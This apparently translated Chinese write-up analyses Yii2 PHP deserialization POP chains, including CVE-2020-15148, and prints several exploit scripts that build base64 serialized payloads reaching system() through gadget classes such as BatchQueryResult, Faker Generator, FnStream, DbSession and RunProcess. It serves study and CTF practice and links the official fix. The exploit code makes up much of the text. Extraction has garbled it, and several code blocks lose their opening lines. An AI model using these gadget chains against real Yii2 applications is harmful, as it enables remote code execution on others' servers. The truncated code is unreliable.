# Yii2反序列化漏洞复现
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
最近复现比赛的时候碰到了挺多和 Yii2
相关的反序列化链子的题目，学习的过程中跟着已有的链子进行了分析，同时跟着思路自己也尝试拓宽了一下链子的数量，在这里正好对此类链子做一个小小的总结。
## 漏洞范围
Yii2 request->get('input');
            return unserialize(base64_decode($name));
        }
    }
访问 `web/index.php`，出现如下页面则环境部署成功
## POP链-1
###  漏洞分析
CVE-2020-15148 的反序列化起点在 `vendor/yiisoft/yii2/db/BatchQueryResult.php` 中  
这里 `__destruct()` 方法会调用 `reset()` 方法，而 `reset()` 方法中的参数 `$this->_dataReader`
是可控的，进一步调用该参数的 `close()` 方法，漏洞点就在于此可以作为跳板来利用 `__call()` 方法执行反序列化操作
全局搜索 `__call()` 方法，跟进 `vendor/fzaninotto/faker/src/Faker/Generator.php`
发现 `__call()` 方法调用了 `format()` 方法，这里的参数 `$method` 和 `$attributes` 都是不可控的，在
`format()` 方法的内部使用了回调函数 `call_user_func_array()` 来调用 `getFormatter()` 方法
继续跟进 `getFormatter()` 方法，这里的 `$this->formatters` 是可控的，所以 `getFormatter()`
方法的返回值也是可控的，结合上一步的分析，回调函数 `call_user_func_array()`
的第一个参数是可控的，第二个参数为空，此时可以利用第一个参数来调用一个可以实现 RCE 的方法，并且这个方法的参数要是类的成员变量、要是可控的
这里利用正则表达式来 `function_you_want\(\$this->([a-zA-Z0-9]+),
\$this->([a-zA-Z0-9]+)\)` 寻找可用的代码执行函数，发现 `call_user_func`
是可用的，`vendor/yiisoft/yii2/rest/CreateAction.php` 和
`vendor/yiisoft/yii2/rest/IndexAction.php` 中的 `run` 方法都可以满足 RCE 的条件
POC链的利用过程为
###  EXP
exp1
    id = 'whoami';
                $this->checkAccess = 'system';
            }
        }
    }
    namespace Faker {
        use yii\rest\CreateAction;
        class Generator {
            protected $formatters;
            public function __construct() {
                $this->formatters['close'] = [new CreateAction(), 'run'];
            }
        }
    }
    namespace yii\db {
        use Faker\Generator;
        class BatchQueryResult {
            private $_dataReader;
            public function __construct() {
                $this->_dataReader = new Generator();
            }
        }
    }
    namespace {
        use yii\db\BatchQueryResult;
        echo base64_encode(serialize(new BatchQueryResult()));
    }
    ?>
exp2
    id = 'whoami';
                $this->checkAccess = 'system';
            }
        }
    }
    namespace Faker {
        use yii\rest\IndexAction;
        class Generator {
            protected $formatters;
            public function __construct() {
                $this->formatters['close'] = [new IndexAction(), 'run'];
            }
        }
    }
    namespace yii\db {
        use Faker\Generator;
        class BatchQueryResult {
            private $_dataReader;
            public function __construct() {
                $this->_dataReader = new Generator();
            }
        }
    }
    namespace {
        use yii\db\BatchQueryResult;
        echo base64_encode(serialize(new BatchQueryResult()));
    }
    ?>
###  修复方法
[参考官方的修复方法](https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99)
#
## POP链-2
###  漏洞分析
前面已经分析了 `vendor/yiisoft/yii2/db/BatchQueryResult.php` 是漏洞利用的起点，由于通过调用
`reset()` 方法进一步调用 `close` 方法，所以直接搜索 `close()` 方法来尝试触发 `__call()` 方法
逐个跟踪后，发现 `vendor/guzzlehttp/psr7/src/FnStream.php` 中的 `close()` 方法会触发
`call_user_func()` 回调函数，且参数 `$this->_fn_close` 可控
    _dataReader = new FnStream();
            }
        }
    }
    namespace {
        use yii\db\BatchQueryResult;
        echo base64_encode(serialize(new BatchQueryResult()));
    }
    ?>
上面构造的 POC 链已经能通过回调函数 `call_user_func()` 执行 `phpinfo`
了，以此为跳板继续寻找一个可以执行命令的类来进行代码执行，利用正则 `eval\(\$this->([a-zA-Z0-9]+)` 匹配到 `eval()`
命令可以利用
跟进匹配到的两个 `eval()` 方法，发现 `$this->classCode` 是可控的，这里构造 exp 时需要绕过 `__wakeup()` 方法
POC链的利用过程为
###  EXP
    _fn_close = array(new MockTrait(), 'generate');
            }
        }
    }
    namespace yii\db {
        use GuzzleHttp\Psr7\FnStream;
        class BatchQueryResult {
            private $_dataReader;
            public function __construct() {
                $this->_dataReader = new FnStream();
            }
        }
    }
    namespace {
        use yii\db\BatchQueryResult;
        echo base64_encode(str_replace('O:24:"GuzzleHttp\Psr7\FnStream":1:','O:24:"GuzzleHttp\Psr7\FnStream":2:',serialize(new BatchQueryResult())));
    }
    ?>
## POP链-3
###  漏洞分析
继续分析前面搜索的 `close()` 方法，跟进 `vendor/yiisoft/yii2/web/DbSession.php` 中的 `close()`
方法，发现其先调用 `getIsActive()` 方法进行一个判断
跟进 `getIsActive()` 方法，这里对会话的状态做了一个判断，当 `yii-debug` 和 `gii`
这两个默认扩展都存在(不一定需要开启)时就会返回 `true`；否则返回 `false`
当 `true` 条件满足时进入 if 循环内，进一步调用 `composeFields()` 方法，再调用 `call_user_func()`
方法，但参数无法控制，传入一个对象为参数的可用函数也不太多，这里采用调用类中的公共方法来实现 RCE，赋值为 [(new demo),
“aaa”]这样的一个数组
结合上面的链子，这里采用 `vendor/yiisoft/yii2/rest/CreateAction.php` 和
`vendor/yiisoft/yii2/rest/IndexAction.php` 中的 `run` 方法，均可实现 RCE  
POC链的利用过程为
###  EXP
exp1
    checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    namespace yii\web {
        use yii\rest\IndexAction;
        class DbSession {
            protected $fields = [];
            public $writeCallback;
            public function __construct() {
                $this->writeCallback=[(new IndexAction),"run"];
                $this->fields['1'] = 'aaa';
            }
        }
    }
    namespace yii\db {
        use yii\web\DbSession;
        class BatchQueryResult {
            private $_dataReader;
            public function __construct() {
                $this->_dataReader = new DbSession();
            }
        }
    }
    namespace {
        use yii\db\BatchQueryResult;
        echo base64_encode(serialize(new BatchQueryResult()));
    }
    ?>
exp2
    checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    namespace yii\web {
        use yii\rest\CreateAction;
        class DbSession {
            protected $fields = [];
            public $writeCallback;
            public function __construct() {
                $this->writeCallback=[(new CreateAction),"run"];
                $this->fields['1'] = 'aaa';
            }
        }
    }
    namespace yii\db {
        use yii\web\DbSession;
        class BatchQueryResult {
            private $_dataReader;
            public function __construct() {
                $this->_dataReader = new DbSession();
            }
        }
    }
    namespace {
        use yii\db\BatchQueryResult;
        echo base64_encode(serialize(new BatchQueryResult()));
    }
    ?>
## POP链-4
###  漏洞分析
在更新后的版本中，`BatchQueryResult` 类的反序列化已经被修复了，但是最新的 patch 只是用在了 `BatchQueryResult`
类中，尝试全局搜索 `function __destruct()|__wakeup()` 来挖掘新的链子
逐个分析查找到的可用类，跟进 `vendor/codeception/codeception/ext/RunProcess.php`，这里先调用
`stopProcess()` 方法，接着调用 `isRunning()` 方法进行判断，但是这个方法不在类中，会触发 `__call()`
方法，并且这里的参数 `$this->processes` 是可控的，因此可以找一个 `__call()` 方法来，这里直接利用前面构造 `POP链-1`
的后半段来拼接一个新的 exp
POC链的利用过程为
###  EXP
exp1
    checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    namespace Faker {
        use yii\rest\CreateAction;
        class Generator {
            protected $formatters;
            public function __construct() {
                $this->formatters['isRunning'] = [new CreateAction(), 'run'];
            }
        }
    }
    namespace Codeception\Extension {
        use Faker\Generator;
        class RunProcess {
            private $processes;
            public function __construct() {
                $this->processes = [new Generator()];
            }
        }
    }
    namespace {
        use Codeception\Extension\RunProcess;
        echo base64_encode(serialize(new RunProcess()));
    }
    ?>
exp2
    checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    namespace Faker {
        use yii\rest\IndexAction;
        class Generator {
            protected $formatters;
            public function __construct() {
                $this->formatters['isRunning'] = [new IndexAction(), 'run'];
            }
        }
    }
    namespace Codeception\Extension {
        use Faker\Generator;